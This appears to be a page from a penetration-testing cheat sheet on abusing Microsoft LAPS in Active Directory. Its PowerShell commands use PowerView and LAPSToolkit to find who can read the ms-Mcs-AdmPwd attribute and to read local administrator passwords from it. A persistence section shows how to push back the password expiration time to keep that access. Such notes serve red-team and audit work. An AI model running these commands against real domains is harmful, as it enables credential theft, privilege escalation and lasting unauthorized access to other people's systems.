---
layout: default
title: LAPS Abuse
parent: Active Directory
nav_order: 1
permalink: /ad/laps/
---

# LAPS Abuse
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

Local Administrator Password Solution (LAPS) allow to automatically manage local administrators' password by the domain. To do so, the property *ms-Mcs-AdmPwd* is added for each domain computer in the domain schema. This property contains the local administrator's password. Depending on how is configured LAPS, you could read this attribute and escalate your privileges locally on domain computers.

## Prerequisites

* [LAPS](/ad/enumeration/#laps) is enforced on at least a domain computer. 

## Exploit

[LAPSToolKit](https://github.com/leoloobeek/LAPSToolkit) is a wrapper around [PowerView](https://github.com/PowerShellMafia/PowerSploit/), so it must be imported first.

```powershell
Import-Module .\PowerView.ps1
Import-Module .\LAPSToolKit.ps1

# Find groups with delegated read access to OU.
Find-LAPSDelegatedGroups

# Find users that have AllExtendedRights on computers so they can read ms-Mcs-AdmPwd attribute.
Find-AdmPwdExtendedRights

# To read the ms-Mcs-AdmPwd attribute of a computer.
Get-DomainComputer -Identity $hostname -Properties ms-Mcs-AdmPwd
```

## Persistence

If you reached this point, you are local administrator of at least a domain computer. To persist on the domain, you can leverage the password expiration date configuration if *PwdExpirationProtectionEnabled* is disabled.

```powershell
# Get the password expiration time
Get-DomainComputer -Identity $hostname -Properties ms-Mcs-AdmPwdExpirationTime

# Set the new password expiration time
Set-DomainObject -Identity $hostname -Set @{'ms-Mcs-AdmPwdExpirationTime' = '$timestamp'} -Verbose
```

## Useful links

* [EpochConverter](https://www.epochconverter.com/ldap) to convert LDAP timestamps to human-readable date.